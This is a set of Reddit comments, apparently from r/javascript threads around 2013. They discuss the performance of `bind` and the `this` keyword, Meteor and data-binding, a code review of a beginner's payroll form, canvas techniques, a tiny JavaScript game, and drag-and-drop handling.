Nice post! Feel free to x-post it to /r/LearnJavaScript. 
Unfortunately there isn't really a great way to use the files directly with &lt;script&gt; tags. However, the same can be said with AMD. Most of the time though, I find that I compile them before using the files, which is different to my workflow when using requireJS. There are a couple of front-end CommonJS script loaders, but I can't vouch for using them.
I recently started to teach myself a bit of JS, and this site: http://www.Thenewboston.com , was sent to me by a co-worker, it has free tutorials for just about any language in use currently and has the basics of html as well. Bonus: It's totally free! HTH
Thanks, I just did based on your suggestion ;) 
Can we get an opinion on Meteor from someone that has used it? I'd ask for an opinion from someone that's used it in a production environment, but from the changelog and the 0.6.0 that seems unlikely. I'm just so skeptical of Meteor's all-encompassing solution. 
Note: the project doesn't use underscore except for one _.each and one _.first. In any case, I think the jury is still out on underscore vs. lodash. lodash has some [benchmarks](http://lodash.com/benchmarks), but underscore has a slightly smaller footprint and much better documentation. I suspect the performance increase would be useful only for certain optimizations, and anything else is premature optimization. In other words, different tools for different jobs. 
Is there a way to do this sort of navigation using javascript/jQuery without running on top of PhantomJS? I'd just like to be able to do this all in the browser.
Sorry, try Stackoverflow
You can definitely tell when the garbage collector runs, but that's true of any perpetual animation. 
`bind` is one of those things like `try` that while awsome in theory is REALLY BAD to use in practice because it just kills performence. While not as [bad as try](http://jsperf.com/try-catch-error-perf/3) you can see in the [map test](http://jsperf.com/map/2) I posted a while back that the version that uses bind is the slowest by far. One alternative method is to use the `var _this = this` trick which creates a variable bound to the current scope this is how fat arrow works on coffee script. 
How long does it take to get early access? :o
I think that's a little too damming on bind. It's only an issue if you are using it, on a large data set. For things like click handlers, the performance overhead is a non-issue. It'll be so small, it will be hard to even detect the overhead it adds, without artificially inflating the cost (such as running it a million times). Stuff like DOM manipulation, will also be far more expensive.
Here is my 6 months experience. I built an entire CMS and I plan to use it on production, but not today. Pro: * Building prototypes is incredibly easy and fast * One logic for server and client. Finally, I can avoid duplicating stuff * Reactivity is really something; no need to manually toggle buttons or refresh the content. Everything is automatically up to date * All the clients are auto synchronized without page refresh * The browser auto refresh when app files changes Cons: * still lack of server side rendering * lack of good/easy deploy solutions; heroku doen't work well * lack of structure. File system is messy, i want something more standard * lack of db models * mongodb only Mixed * vertical integration. Breaks node best practices in order to achieve a more streamlined workflow. Conclusion This framework has potential but its still young. It simplify tasks and cut development time in some niche application, and is nice to use on general purpose stuff. I think server side rendering, standard development patterns and more testing are mandatory for real life uses. Despite having still some weak points, I don't see anything that can't be solved with hard work (and they work really hard).
What I would do is, at the start, store new Date() in a first variable. At the time you want to display the current value, store new Date() in a second variable, and simply subtract the two, and you'll get a time difference in milliseconds. There's no need, *ever*, to update the first variable. That is your absolute reference point. That can also give you how much time is left for the next desired clock update, for setTimeout. (If the current value is 10221 (ms) then there's 779 ms until the next second, and 79ms until the next 10th of a second.)
It's literally an order of magnitude slower (10% as fast) so as long as you're 100% sure it's never going to be used inside of a loop, or an object constructor go ahead use it. Realistically you're going to want to avoid it along with `try` and `eval` as things that will bite you in the ass if your not paying attention at lower levels than you'd think. It'll make a noticable difference on a 1,000-10,000 item array esp in an older browser. Thats the kind of size that can sneak up on you.
I may just get banned for saying this because some people hate CoffeeScript so much, or at least talking about it in r/javascript, but if you write it in CoffeeScript, you can just use fat arrow. class DeathStarTarget constructor: (@planet) -&gt; onClickSuperLaser: =&gt; @destroy @planet destroy: =&gt; alert "#{@planet} goes boom" # DESTROY IT target = new DeathStarTarget 'Alderann' $("#button").on "click", target.onClickSuperLaser
I actually just started a 7 week study group to go through this: http://www.reddit.com/r/learnjavascript/comments/1bombd/announcing_the_how_to_learn_js_properly_study/ Your friend should join.
I just started this study group: http://www.reddit.com/r/learnjavascript/comments/1bombd/announcing_the_how_to_learn_js_properly_study/
Thank you very much for your advice.
Well people have always applied the [Pareto principle](http://en.wikipedia.org/wiki/Pareto_principle), that 80% of code takes up 20% of the CPU, and 20% of the code takes up 80% of the CPU time. Personally, I find it's more like 90/10. As I said, for things like click handlers it's fine. It's also ok anywhere else, including constructors, and any other code; the depending factor is how much performance bind takes up. You will only get that through profiling, although obviously there are application domains where it smells bad. tl;dr; it depends on the use case.
It is fine for click handlers, yes. But, you are evidently only using basic JS to spice up an html page if you think it is fine everywhere else. JS powers WebGL, Node, WinRT, WebOS, and some very powerful web apps - just to name a few situations in which JS performance is an enormous concern.
I'm not sure why this is referred to as a problem, if anything I think it's a nice feature of the language. It's only a problem if you don't understand how the language works.
quick what's the value of `this` no googling * in global scope * in strict mode * in a web worker * in a function created with bind but called from inside `setTimeout` * in a function created with a declaration inside an if statement that didn't get triggered 
Fat arrow is one of the reasons I find myself going back to CoffeeScript when I have to write code that uses more of an OO style (I.E. backbone)
Exactly. I hate articles like this because it gives ammo to people who want to blame the "stupid language" for what amounts to their own misunderstandings. 
&gt; But, you are evidently only using basic JS to spice up an html page if you think it is fine everywhere else. I pretty much *only* build applications which are 99% JavaScript. These include a [compiler](http://github.com/PlayMyCode/Quby) (ok, it's actually TypeScript now), a [paint editor](http://www.studiofortress.com/skybrush), [a visual language](http://github.com/JosephLenton/Slate), [a text editor](http://github.com/JosephLenton/Blocky), virtual keyboard (not in it's own project yet), [my own web application building framework](http://github.com/JosephLenton/platform.js), [a system for writing papers in markdown](http://github.com/JosephLenton/mark-doc), and lots of other random stuff. Of those that include HTML, they only include 1 page, for testing. I think the compiler is the only one with more than 2 pages of HTML, and that's because I was sick of the testing page looking like ass. The fact I write so much JavaScript, is actually why I don't have a problem using things like bind (although I actually my own alternatives built on top of bind, and even replace bind with my own). It saves time, and reduces how much you can write. If there is not going to be any noticeable performance overhead, why wouldn't you use bind to save a few lines? It all depends on the use case; will this section of code be run heavily in a short space of time? No, then don't worry about it. Does the application feel laggy? No, then don't worry about it. Is there a noticeable performance overhead when profiling? No, then don't worry about it.
guess again edit: yeah that's not an issue related to `this` but if(false){ function sum(a,b){ return a+b; } } creates the function sum in current scope even though the code is never run, but because the function get's hoisted out if(false){ var sum = function(a,b){ return a+b; } } never mind I don't even want to try that version but var sum; if(false){ sum = function(a,b){ return a+b; } } does exactly what you expect it to do
&gt;If there is not going to be any noticeable performance overhead, why wouldn't you use bind to save a few lines? That, or for readability are the two scenarios in which I would use bind, provided cross browser compatibility is not in a problem. In every other scenario I would avoid it. That is my point.
Nicholas Zakas's [Maintainable Javascript](http://www.nicholascloud.com/2012/06/maintainable-javascript-book-review/) Cody Lindley's [JavaScript Enlightenment](http://javascriptenlightenment.com/) NCZ's [High Performance JavaScript](http://shop.oreilly.com/product/9780596802806.do) Presumably you're using JSHint/JSLint? That's a good way of improving your code too.
I'm just now really learning it, but it seems very promising. The Meteor team, which is a very talented group of devs (Google Wave, Asana, etc.), just got funded $11.2 million to develop this full-time so it's definitely not going anywhere anytime soon. In fact, the releases are coming out very consistently and the entire project seems very well organized. Right now it seems like people are just dipping their toes in because it doesn't have the coveted "1.0" sticker on it. As a result, almost all the apps that people make are little sample projects, but considering it's only been out for a little over a year, and there have been [hundreds of these little apps](http://madewith.meteor.com/) and [plugins](https://atmosphere.meteor.com/) built for it, it's probably safe to say it's very popular. From everything I've heard people say, and from the really good devs I've shown it to, it really is revolutionary. I mean, I used to be a Django fanboy but I've seen hybrid apps built in Django and there are quite a few moving pieces to get it to do really basic real-time stuff (forget about how wonderful latency compensation can be), whereas with Meteor, you just write some HTML/CSS/JS, and it just works everywhere. After looking at all the different languages and frameworks out there, I'm pretty confident in saying server-side Javascript is the future, and Meteor just wraps it all up in a nice package with a bow on it. It might not be 100% production-ready, but I'm going to start using Meteor for everything I do and updating these projects as new versions come out. It will make me a master at Meteor, and I really do think Meteor is the future of web development, so if I get my practice in with Meteor now, I'll jump ahead of the curve. Again, here are a bunch of apps, some in production, made with Meteor: http://madewith.meteor.com Also, for those interested, I became a mod at /r/meteor and I'm reviving the crap out of that subreddit, so feel free to stop by and chat about Meteor with me. :}
High Performance Javascript is another great one, I read it right before a job interview and it really helped me nail a couple of the questions. 
- the global object; generally `window` in a browser context - that's not very specific - I don't use web workers, but if I did presumably the documentation would tell me if I needed to use it - whatever it was bound to, also that phrasing is sort of ambiguous - not defined by the spec, so you shouldn't do that anyway Yes, there are obscure conditions where it's not obvious what `this` means, but those are all situations where you shouldn't use it and have no reason to use it anyway.
&gt;if(false){ &gt; function sum(a,b){ &gt; return a+b; &gt; } &gt;} &gt;This is undefined. Function declarations can only be at the top level of a file or directly within another function. You can't place them in a block. I know it's not recommended by anyone sane but it's only undefined in strict mode it's defined in non-strict mode, but they do technically turn into expressions when declared that way.
I was trying to go for crazy cases where a fairly experienced js programer can be tripped up by this, whether or not it's helpful or not is irrelevant it is very hard to master, the setTimeout one tripped me up once. * yes * i meant globally in strict mode * self * nope bind will let you down * that's just me being mean
&gt; nope bind will let you down Like I said, your phrasing was sort of ambiguous. Show me the code so what I know what you mean. As far as I know, any time you'd actually _want_ to use `this`, what it means is usually fairly obvious.
here is the [mdn article about it](https://developer.mozilla.org/en-US/docs/DOM/window.setTimeout#The_.22this.22_problem).
No version of the ECMAScript allows a function declaration there in its grammar. Browsers choose to parse it (and do so differently), but it's technically a syntax error.
Yeah, that's just a callback. All callbacks work that way, there's nothing special about `setTimeout`. The first question is: why would you want to read `this` from a callback function? If you're looking for the `this` value of an outer function, there are two ways. One's to copy it onto a different variable var that = this; setTimeout(function(){ that.doSomething(); }, 1000); One's to bind it setTimeout(this.doSomething.bind(this), 1000); Both of them will call `this.doSomething()` after a second. So no, `bind` won't let you down if you use it correctly. You were probably just using it wrong.
You've seen [these slides](http://www.slideshare.net/TrevorBurnham/sane-async-patterns/)?
What are you doing with your CMS? I've been building one as well to teach myself Meteor (its on github, but its very alpha). For your cons: &gt;* still lack of server side rendering Do you mean for SEO purposes? Doesn't the spiderable package handle that? It uses phantom.js, which is a typical solution (though not great) for javascript-heavy web apps. They're working on a better solution. &gt;* lack of good/easy deploy solutions; heroku doen't work well Haven't had experience with this, but yeah it doesn't seem super straightforward. &gt;* lack of structure. File system is messy, i want something more standard There are various recommendations out there; I'm sure some patterns will emerge but IMO just use what works best for you. &gt;* mongodb only A MySQL package exists; Various other DBMS will surely emerge soon. Meteor is a lot of fun but yeah its still pretty darn young. Its definitely exciting to be in the forefront of a cool new technology, I missed the rails boat by a couple years.
I haven't watched the video yet, but regarding bundling/editing the combination of [grunt](http://gruntjs.com/) + [grunt-browserify2](https://npmjs.org/package/grunt-browserify2) + [watch](https://npmjs.org/package/grunt-contrib-watch) makes a nice dev environment
It's funny, Underscore is mentioned but there is no mention of [`_.bind`](http://underscorejs.org/#bind). It's basically the same as $.proxy.
From a near-historical perspective, ActionScript 3 had essentially "solved" the `this` problem. The approach there was to downplay prototypical mechanisms, push for the use of java-like keywords like `class`, `interface`, `public`, etc.. That `class Stormtropper` code sample at the top of the article linked? Almost valid ActionScript 3 code (the typing syntax is slightly different, but that's it.) Now, you might say "That's obviously not JavaScript", but ActionScript 3 is a strict superset of ecmascript 3 (in fact based on the now defunct ecmascript 4 proposal.) So the secret to solving `this` in AS3 was simple: Every method declared in a `class` was automatically bound to its instance when called. Performance wasn't obviously suffering for it either. For a few years, the AVM2 engine running AS3 code was by far the fastest EcmaScript engine available in browsers. I haven't stared at the ES6 proposal spec for long enough, but there's some chance that a similar mechanism may end up being in the Harmony spec. 
I literally just finished looking at them. Awesome. Just what I was looking for.
The thing is, Backbone was used well before the 1.0 sticker came around. &gt;I'm pretty confident in saying server-side Javascript is the future, and Meteor just wraps it all up in a nice package with a bow on it. This is either right or completely, terribly flawed. Server side Javascript _is_ the future. But browser-side Javascript is more important, because the browser is the actual user experience. Meteor's problem, in my mind, is that it has done both. It tries to make two machines one machine. A server and a user. It's impossible. Node exists as the future of server-side javascript because it creates a server. It doesn't let you write server code in the browser. Correct me if I'm wrong, but Meteor seems to me to be the ultimate in data-binding. And data-binding must die. You've given quite a good series of advertisements for Meteor, but I'm looking for more of a conceptual argument. 
who cares? fuck em
This would take care of it: setTimeout(function(){ this.foo(); this.bar(); this.baz(); }.bind(this), 1000); There's nothing really unique about setTimeout.
i had a really time understanding how it worked when i started programming javascript but when you finally get it it isn't actually a problem...
You might also want to read http://blog.caplin.com/2013/03/13/callback-hell-is-a-design-choice/
Okay, some thoughts and revisions. **HTML tags** - Using capitals for your HTML tags is an indicator of ancient techniques. Due to XHTML requiring lowercase, people commonly use lowercase for their HTML tags so that it's easier to switch over if need be. Also, be sure to properly close your HTML tags. You have an opening *head* tag that isn't closed before you get to the *body* tag. You can check if your HTML code is valid by submitting it to the [W3C markup validation service](http://validator.w3.org/#validate_by_input) **Script tags** - Your existing script tag uses the *language* attribute, which is not used at all now. Instead, the *type* attribute should be used. Also, move your script tags down to the end of the body. Not only that that make the page load faster (because pages are forced to stop loading while scripting is being processed) but it also provides more flexibility to your script, because it can now access page elements while the page is still loading. &lt;body&gt; ... &lt;script type="text/javascript&gt; &lt;/script&gt; &lt;/body&gt; **Forms** - The elements within a form should be contained within bock-level elements. This means at a minimum, to use paragraph tags around ALL of the elements of the form. **Accessing the form** - please do not use the *name* attribute on the form tag itself. That is an unofficial way to access forms. Names should be used only on individual form fields that you intend to submit. Instead, use an id attribute on the form itself, and access the form via that identifier. Also, a move correct way to access form elements is via the form's *elements* collection. &lt;form id="fedform" action=""&gt; ... var form = document.getElementById('fedform'), hours = form.elements.hours.value, ... **Onclick events** - Do not use inline HTML event attributes to assign functions to elements on a page. They are brittle and break easily when you change the scripting, resulting in you having to change the HTML too. Instead, use scripting to assign the scripting function to the HTML element. var calcButton = document.getElementById('calc'); calcButton.onclick = calculate; Another major benefit of doing things that way is that the calculate function can now easily gain access to the element that the event was assigned to, via the this keyword. function calculate() { var form = this.form, ... **Variables** - all variables should be defined to prevent them from being global variables, which helps to protect the global namespace. It's like a public toilet facilities. You can't avoid going in there, so limit your contact with surfaces when you do. Define variables together at the start of the function that they are in, instead of in separate *var* statements. This helps to prevent any problems from defining variables after they have been used. For example: var form = document.getElementById('fedform'), hours = form.elements.hours.value, ... **Status variables** - Speaking of global variables, you don't need the single/married status variable, and you don't need to run a function when someone clicks on their radio button. Just check for their status from the code instead. fed_table = (form.elements['s'][0].checked) ? s_fed_table : m_fed_table; which would actually be better all combined as an actual function: function fed_tax_table(single) { var single_fed_table = ..., married_fed_table = ...; if (single === true) { return single_fed_table; } else { return married_fed_table; } } fed_table = fed_tax_table(form.elements['s'][0].checked); **Braces** - Failure to show statement blocks is a great cause of bugs. Also, do not drop the opening brace down to the next line. JavaScript is one of those rare languages where opening braces is not just a matter of style, due to automatic semicolon insertion resulting in your code behaving differently. So always place opening braces at the end of the line. if (hours &gt; 40) { total_pay = 40 * payrate + (hours - 40) * payrate * 1.5; } else { total_pay = hours * payrate; } **Iteration** - Use commonly understood conventions for your loops. Why are you using *r* for the loop index? Does it mean something special? Is it used elsewhere? If not, stay with *i* as the loop index. for (i = 0; i &lt; 6; i += 1) { ... } **Simplify loops** - Instead of storing the loop value and then using it in only one place, do it inside of the loop instead. You will save variables, and you can break out of the loop as soon as you're ready. var i; for (i = 0; i &lt; 6; i += 1) { if (total_pay &gt;= fed_table[i][0]) { fedwith = fed_table[i][1] + (total_pay - fed_table[i][0]) * fed_table[i][2]; break; } } **Arrays** - What does [0,0,0] from the array mean? I have no idea by looking at it, and you won't either without closely investigating the code. Make it clear and obvious what the data is supposed to be. var s_fed_table = { wageLimit: [ 51, 525, 1125, 2535, 5475], withhold: [0.00, 71.00, 239.10, 676.20, 1734.60], incomeTax: [0.15, 0.28, 0.31, 0.36, 0.396] }, ... fedwith = fed_table.withhold[i] + (total_pay - fed_table.wageLimit[i]) * fed_table.incomeTax[i]; **Writeln** - Writing straight to the document is a bad practice that is best to be avoided. Better is to have a results section of the page, that is cleared and written in to when you want to update things. &lt;div id="result"&gt;&lt;/div&gt; function showResult(empname, payrate, hours, total_pay, city_tax, fedwith) { var result = document.getElementById('result'); result.innerHTML = '&lt;p&gt;Welcome to the online payroll processing program&lt;/p&gt;' + '&lt;p&gt;The Payroll For: ' + empname + '&lt;/p&gt;' + '&lt;p&gt;Payrate: ' + payrate + '&lt;br&gt;' + 'Hours Worked: ' + hours + '&lt;br&gt;' + 'Total pay: ' + total_pay + '&lt;/p&gt;' + 'City Tax Withholdings: ' + city_tax + '&lt;br&gt;' + 'Federal Withholdings: ' + fedwith + '&lt;/p&gt;'; } showResult(empname, payrate, hours, total_pay, city_tax, fedwith); That now lets you keep the form on the same page as the results, letting you try out different settings on the form with much greater ease. Finally, we can keep the protection of the global namespace in mind, and place all of the scripting code within its own anonymous namespace. (function () { ... }()); **Cleaning up** - You can find out about any final things that should be taken care of, by running your scripting code through [JSLint](http://www.jslint.com/) The end result of all of this can be found at http://jsfiddle.net/pmw57/xubnx/
Please read https://gist.github.com/domenic/3889970
You're incorporating jQuery promises but still using nested callback pyramids?
Coffeescript provides a very clean solution to this problem.
That sounds like a good idea. I did that with another friend and he made web tools for his work (he grows crystals for solar power). I should do the same except I didn't break it down before and I think that's a good idea to break it into components and have them put it all together at the end. Thanks!
Well not really, it just acts like it would anywhere else within the function. But when you use "use strict"; you are not allowed to do this anyway which mutes the question. 
If that could mean multiple layers and partial updates in a nice api for game engines, then I'm all for it. Not sure about any other uses though. Oh, and nice job with canvas query, its really nice, especially for fast prototyping and experiments!
&gt; And data-binding must die. Could you elaborate on this? I'm currently dipping my toes in AngularJS, so if I'm going to experience problems with this I'm a bit worried :)
While the basic idea is rather neat, wellformed and -documented code should not need such a notation in a standardized way. Anything beyond the constraints of the function should throw an meaningful error ("received NaN-string instead of number as second argument [number of instances]"). Functions that are virtually overloaded (take different arguments for different effects) should be documented anyway.
Thanks. The thing is I also cannot imagine any other use than multiple layers - and I think layers as separate canvases inserted to DOM are not a super boost anymore - I switched to doing it offsceen and just merge them all on one visible canvas.
Yes, processing.js compiles inline scripts into javascript at runtime. http://processingjs.org/articles/jsQuickStart.html
Wrapping that kind of setup (offscreen canvases and merge to onscreen) seamlessly with good performance could be really nice as well. Does merging largish canvases really have so little overhead compared to just DOM composition? I'm kind of surprised, though I've never done any proper testing. 
Yeah since about a year I don't stack DOM layers anymore. It is also much easier to scale final scene to fit the window - haven't done proper testing either but for any of my games I never found it to be a bottle neck :)
That's actually pretty fun. :) (Took me three tries to win it...although I only looked at the instructions after the first try.) Not the most graphically pretty of the entries I've seen so far, but closer to being an actual game.
Thanks. With only 1024 characters available (and not much more uncompressed) you have to decide whether you want to emphasize graphics, sound, interactivity, or internal logic and I chose a bit of all. But hey, I've seen uglier flash games. ;)
This. Also throw in LiveReload/CodeKit/something else to auto-reload your browser on changes ftw.
the receiver of the message/invocation :)
So, I'm clicking around and not seeing any links to the source.
Yeah, we made Frame.js specifically to deal with the callback pyramid of doom. Frame.js is a flow control library and script loader for Javascript applications. It targets broad application flow, and/or animated sequences. Here is the description from the website: Despite the benefits of non-blocking asynchronous code execution in Javascript, endless chains of callback functions make for unreadable code and difficult to control applications. While many function sequencers exist, such as async, Seq, and flow.js, Frame.js is focused on application-level synchronous function management, includes a library loader to mix-and-match between remote scripts, local scripts, and functions, and provides a basic set of debugging and unit testing tools. Frame is like require.js, but designed for the frontend, with debugging tools, and it clocks in at just under 11k (compared to require.js's minified 25k).
That was actually fun to play, nice job!
It's absolutely trivial for a compiler to optimize such a case so I'm not surprised some engines can run it that fast. Obviously SpiderMonkey (Firefox) doesn't do it but the impact on real-life use cases is probably negligible.
Just subtract the Date objects, it will give you milliseconds. 
Can you squeeze out four more characters by replacing `!((x|y)&gt;&gt;3)` with `~x&amp;~y&amp;8`? 
It looks like you are declaring these functions but never calling them. It's very likely that Chrome achieves such high speeds by never actually doing anything with this code, since it's all dead code. I can't possibly imagine how this would relate to any real world situation. 
Yes, that would be possible. However, there are three problems. 1. In the actual code I do (s|t)&gt;&gt;3||(...) which means that ~x&amp;~y&amp;8&amp;&amp;(...) is only one byte shorter. 2. What's worse is that I use '~' for compression. Replacing the code with your version would thus save me one byte but also cost one byte because I could compress less. 3. Even worse is that the string ")&gt;&gt;3||(S=" occurred twice which saved me 5 bytes. Then again, without it I have a free character to do the replacement from 2. In total that's 4 bytes more than the current code. But thanks for the tip. Maybe I can use it next time. :) EDIT: line breaks
Nice job! One thought: the labels tend to overlap, so could you add labels to the boundary calculation?
I literally stopped reading at this point: &gt; it would have made our lives a lot less complicated because it’s far easier to find and then hire people to write jQuery or Backbone with most of the guts of JavaScript abstracted away. **That's not JavaScript** That's the DOM you're talking about, and the only reason jQuery came into being was Microsoft being stupid and intentionally breaking the DOM API in a myriad of ways. With IE8+ cleaning up that act, you can finally use the DOM API as an actual API to code against.
Thank you! Yeah, that would be nice to do!
You haven't actually listed any cons against reactivity? What's bad about it? Because in my real world experience reactivity solves a lot of problems. Edit: Also I would like to mention the fact you cited something as impossible that we were doing on mainframes in the 1970s.
Hey, I wonder if you would consider working on a version of this to accompany Typecastjs.org? 
http://docs.seleniumhq.org/projects/
Why must data binding die? It seems pretty awesome. :\
at the least, here's the code you supplied in proper jsFiddle format (html in top left, css top right, js bottom left) [Result](http://jsfiddle.net/XvcxL/8/) it looks like imgur returns forbidden for images accessed via jsFiddle iframe though? Also I'm not sure I understand what you're trying to accomplish? The code doesn't really do anything besides set the image data and put it into a drop target.
&gt; wellformed and -documented code should not need such a notation in a standardized way Could you please provide examples of code you think does this well? Library documentation, etc. jsig's primary goal is to improve clarity and readability of documentation. If it fails to do that, it's not adding value.
&gt;Coffeescript provides a very clean solution to this problem. While introducing *many* problems of its own. No thank you.
Is it or is it not easier to hire people to write jQuery or Backbone or whatever than it is to find people who know how to code against the DOM API? Whatever your feelings on jQuery or IE or whatever, it's a basic empirical claim.
That's what I'm trying to fix. I want the droppable zones to only accept a specific image and reject the others. Right now, it's treating all images as okay to drop in any dropzone. 
If you're trying to make it so div1 only accepts image 1, try this [fiddle](http://jsfiddle.net/XvcxL/13/) you can add a data-accept attribute to your divs to tell them what you want to accept (this can be customizable to whatever your need is) Like so: &lt;div id="div1" data-accept="drag1" ondrop="drop(event)" ondragover="allowDrop(event)"&gt;1&lt;/div&gt; function drop(ev) { ev.preventDefault(); var data = ev.dataTransfer.getData("Text"); var dragElement = document.getElementById(data); var accept = ev.target.dataset.accept; if(accept){ console.log("accept? "+accept); } console.log("dragElement: "+dragElement.id); if (accept){ if(ev.target.dataset.accept == dragElement.id) { ev.target.appendChild(dragElement); } } else{ //no accept criteria, accept all drags ev.target.appendChild(dragElement); } } You may want to consider doing the validation of whether it can drop there in the allowDrop function though so that you can have browser indication through the icon of whether a drop will be allowed. 
My issue is with the author's claim that the DOM is "JavaScript". It's not. Not going to read anything written by someone who doesn't understand the basics. EDIT: &gt;&gt;&gt; document.getElementById.toString() "function getElementById() { [native code] }" The DOM is a set of Javascript wrappers on native code to talk to the HTML rendering engine, and has nothing to do with the design of the language. Just an API exposed by the browser so the language can do something useful on the client side.
I think I haven't been using it to its full potential.
thank you thank you. I'm actually only working on one browser (it's for an interactive publication). 
I would never go through this shit if it wasnt so cool presented
Can you explain this a bit further?
Because you already think of content on the page as objects: "search bar", "menu", "footer", etc. It's a lot easier to maintain a website if all the code for an object is in the same place. For example: There is something wrong with your footer. With omit, you just get the class of the object you want to edit, which in this case is footer, and then locate it in the objects-file, where you then can edit all the html, css and js. W/o omit.js: you have to search your css/js or html for id or class "footer" and open and scroll through at least 3 files. 
Fucking amazing.
I've known about strange results like this for a while now. Especially Chrome being fast at odd things. What I wonder about is what aspect of the engine it's actually measuring. I mean, one engine can certainly be completely better than other, but sometimes it's just the side effect of an unrelated trade off. I wonder what sorts of test the authors look at and which results they actually care about.
Very nice! Quick q, what do you use as an editor to format you js like that? I really like the way the object key/values are indented. 
You want to turn every browser in the world, software running on a fully capable machine, as a simple terminal to a server? 
[This is what I wrote the last time I was asked this question.](http://www.reddit.com/r/javascript/comments/19zmls/shibarijs_a_minimalistic_databinding_library/c8sxpkp?context=3)
If you use sublime text 2 you can use the alignment plugin. [Link]( http://wbond.net/sublime_packages/alignment)
It seems you're against frameworks in general. Well, when people are using them without fully understanding what's going on behind the scenes. So, what if I know what's going on behind the scenes and can control propagation at any interval. Wouldn't a data-binding framework streamline things in that case?
What a terrible way to present information.
Without getting into the nitty gritty of currying or partial applications mathematical foundation, at the core is the issue of *function composition*. The same way you can create complex behavior from a large number of individually simple classes, that interact by way of inheritance, composition, etc, these techniques allow you to do the same with small and simple functions (with varying shape/form, depending on which specific route your language/enviroment takes).
That's pretty cool, but it's not immediately apparent that decreasing the speed slider will cause the respective element to move in reverse. I like the use of the requestAnimationFrame shim. I'm super excited for more browsers to support it. 
Well that was easy.. thanks!
Please die.
I will...
But… it's not fractal, is it?
This **always** refers to the context that the function is executed in. It's pretty damn straight forward.
It's not a problem any more than the correct use of the word "problem" is a problem in english. Some people might not know how to use the word, but that doesn't make the word or the language a problem, it makes their lack of education a problem.
Have you seen: https://github.com/dreamerslab/node.inflection has quite a few features, e.g.: var inflection = require( 'inflection' ); inflection.pluralize( 'person' ); // === 'people' inflection.pluralize( 'octopus' ); // === "octopi" inflection.pluralize( 'Hat' ); // === 'Hats' inflection.pluralize( 'person', 'guys' ); // === 'guys'
It doesn't follow the normal closure rules that's why it's tricky. 
There is a typo but I am not signing up for an account to tell them.... it's not "Kazzing"... it's "Kaazing".
any of the above better than https://github.com/isaacs/node-supervisor ?
He is one of the worst lecturers I have ever seen... 
This isn't the place for memes...but that was pretty good
Awesome! Small hint: maybe you can make the speed sliders less sensitive in the middle (if it's from -1 to 1, maybe raise the slider value to the 3rd power, like http://www.wolframalpha.com/input/?i=plot+x%5E3 )? The way it is now, a small change makes the speed go up way too early, and accurately setting the speed is difficult.
yeah this sketchy swf doesn't work for me.
You didn't say if you're using normal (HTML or SVG) elements or drawing everything to a canvas element. Moving HTML elements on the page can be done by setting `position: absolute` on them and then modifying their `left` and/or `top` property over time. For SVG elements, you just modify their `x` and `y` properties. Doing that would be trivial with a library like jQuery, but that wouldn't really be appropriate for a game. Take a look at [setTimeout](https://developer.mozilla.org/en-US/docs/DOM/window.setTimeout) to see how to execute code after a specified number of milliseconds. Games normally have a central game "loop" (not an actual loop since it uses timers instead of `for` or `while`) where each tick of the loop asks each object to update itself (calculate its new position based on its speed, the direction it's heading in, gravity, etc) and then render itself (actually draw it to the canvas or just updating the element's properties if that's how you're doing it). Then they schedule another tick. Keeping the update logic separate from the render logic helps in preventing your code from turning into spaghetti. If you're trying to do this on a canvas element, you clear the canvas and redraw every single object on each tick of the loop. It sounds expensive, but you can partition your objects into layers and draw lower layers less frequently by drawing them on an invisible canvas to "cache" their pixels. Then you draw that canvas to your visible canvas instead of iterating all of the objects on that layer. Save the optimizing until you realize you need it, though. Hope this helps and have fun. 
Nice work. This is going to be fun to fork/play with :)
This isn't the sense in which the author uses the word. 
It's not terribly exciting if you use the same value for all of the speeds; :/ [http://codepen.io/anon/pen/kLBCr](http://codepen.io/anon/pen/kLBCr)
I'm creating a CMS with reactive functionality. At the beginning I though it was overkill bit now i've switched my website (previously on wordpress) and i'm really happy. Message me if you want to exchange ideas about CMSs. As for the packages suggestion, yeah, there are solution for 90% of the points. The only real PITA is deploying somewhere, but I heard good thinks about amazon EC2
Not 100% sure what you're trying to do. You want it so that when you click on div, and of them toggle?
I disagree
[This](http://jsfiddle.net/mkantor/dFYLq/) is what popped into my head when reading your requirements. Maybe it'll be useful as a jumping-off point.
Thank you very much! You've given me lots to think about :)
That is pretty dang close to what I need. Thank you!
Luckily hood.ie came to the rescue and as a follow up all I need is an angular adapter for hoodie. The job is posted on Elance, Freelancer, and Odesk: https://www.elance.com/job/40077787/proposals https://www.freelancer.com/projects/Javascript-Software-Architecture/Create-Hoodie-AngularJS-adapter-with.html https://www.odesk.com/jobs/Create-Hoodie-AngularJS-adapter-with-Yeoman-0b4-Angular-Generator_~~deb45ba3ee122d03 I've gotten Arch Linux with Sublime Text (git, jshint, editorconfig), nodejs, npm, nvm, hoodie, filezilla, and meteor to work. So I'm all set.
He made the same joke 3 times :[
No you won't.
I'd just like to mention that I tried to open your menu on mobile and it didn't work.
I would make 2 divs then use rand to assign a random number between 10 and 20 to incrementally animate them by. Wrap the animation in a conditional that checks if either div is on the right side of window. Declare winner. Gg **Edit:** I suck at JS, but somethingish like this -&gt; http://jsfiddle.net/qn2b2/ I would love to see someone else's version of this. Doesn't have to be canvas or svg like the others are suggesting (although if you want it to be cool and have a track and all that, it should be). Ugh, just tested it and if both cross the "finish line" (the window edge), then they both "win". Derp. I'll end up redoing this a million times until it's awesome. Let me know if you think of any other exercises like this. I'd love to keep practicing. :) **Edit2:** Here's a much less suck-filled version: http://jsfiddle.net/XNC8W/2/ This version gets rid of the superfluous callback: http://jsfiddle.net/3g2D5/1/ ...aaaand a reset for replay value: http://jsfiddle.net/3g2D5/2/ (I'm having entirely too much fun with this) TBH, the first version with it's "Oh! Red takes the lead, lets roll again to see if blue makes a comeback!" is kinda exciting (except for the bug).
I'm not sure I understand, but I'll give it a shot: You want something to appear if you click on something: $('#field1').click(function(){ $('#field3').show(); }); Or, if you don't want to use jquery: &lt;input id="field1" onclick="document.getElementById('field3').style.display = 'inline'; I think you're asking how to figure out the names for field1 and field3, but I'm going to need more information. How many loops are you doing? Can you add more information?
See that's the problem. Lets say I have 10 different listings, all of them will have the same IDS if I use a while loop. If I don't have a while loop and individually create every single item except with a different class for every option, that would be impossible to scale and manage. See what I mean? EDIT: ex while($row=$stmt-&gt;fetch();) echo "&lt;div id='1'&gt;text field 1 - text field 2&lt;/div&gt; &lt;div id='3'&gt;text field 3&lt;/div&gt;"; and if I apply your code $('#1').click(function(){ $('#3').show(); }); Then, if I click on the specific part, #3 for EVERY SINGLE LIST will show up.
